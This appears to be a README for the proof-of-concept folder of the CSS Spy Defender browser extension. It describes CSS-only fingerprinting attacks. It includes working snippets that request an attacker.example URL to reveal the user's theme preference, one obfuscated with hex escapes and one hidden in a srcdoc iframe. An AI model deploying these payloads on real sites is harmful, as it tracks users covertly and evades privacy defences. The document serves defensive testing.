# CSS Fingerprinting Proof of Concepts

This folder contains proof-of-concept demonstrations of CSS-only fingerprinting attacks that CSS Spy Defender protects against.

## How to Test

1. Open any PoC HTML file in Chrome
2. Open DevTools (F12) → Network tab
3. Reload the page
4. Observe which URLs are requested

**Without extension:** Only one URL (either `/light` or `/dark`) is requested based on your system theme.

**With CSS Spy Defender:** Both URLs are requested, preventing the attacker from inferring your system configuration.

---

## PoC 1: CSS Escape Attack (`dark_light_escape.html`)

### What it demonstrates

CSS allows hex escape sequences for characters. Attackers can obfuscate fingerprinting code to bypass naive detection:

```css
/* Normal */
background-image: url("https://attacker.example/light");

/* Obfuscated - same result */
background-image: u\72l("https://attacker.example/light");
```

Here, `\72` is the hex code for the letter `r` (U+0072), so `u\72l` = `url`.

### Attack vector

```css
@media (prefers-color-scheme: light) {
  .probe { background-image: u\72l("https://attacker.example/light"); }
}
@media (prefers-color-scheme: dark) {
  .probe { background-image: u\72l("https://attacker.example/dark"); }
}
```

The attacker's server logs which URL was requested, revealing the user's system theme preference.

### Defense

CSS Spy Defender decodes CSS escape sequences before parsing, catching obfuscated `url()` patterns.

---

## PoC 2: iframe srcdoc Bypass (`dark_light_iframe.html`)

### What it demonstrates

Content scripts may not be injected into `srcdoc` iframes by default, creating a blind spot for defenses.

### Attack vector

```html
<iframe srcdoc='
  <style>
    @media (prefers-color-scheme: light) {
      .probe { background-image: url("https://attacker.example/light"); }
    }
    @media (prefers-color-scheme: dark) {
      .probe { background-image: url("https://attacker.example/dark"); }
    }
  </style>
  <div class="probe"></div>
'>
</iframe>
```

The iframe operates in an `about:srcdoc` context. Without proper configuration, the extension's content script won't inject here, leaving the fingerprinting code unprotected.

### Defense

CSS Spy Defender uses `match_about_blank: true` and `all_frames: true` in manifest.json to ensure content script injection into all iframe contexts.

---

## Summary

| PoC | Attack Technique | Defense Mechanism |
|-----|------------------|-------------------|
| URL Escape | CSS hex escapes (`u\72l`) | `decodeCssEscapes()` normalization |
| iframe srcdoc | Exploit content script blind spots | `match_about_blank: true` in manifest |

Both attacks rely on CSS-only techniques (no JavaScript required), making them effective even in restricted environments like email clients or Tor Browser.
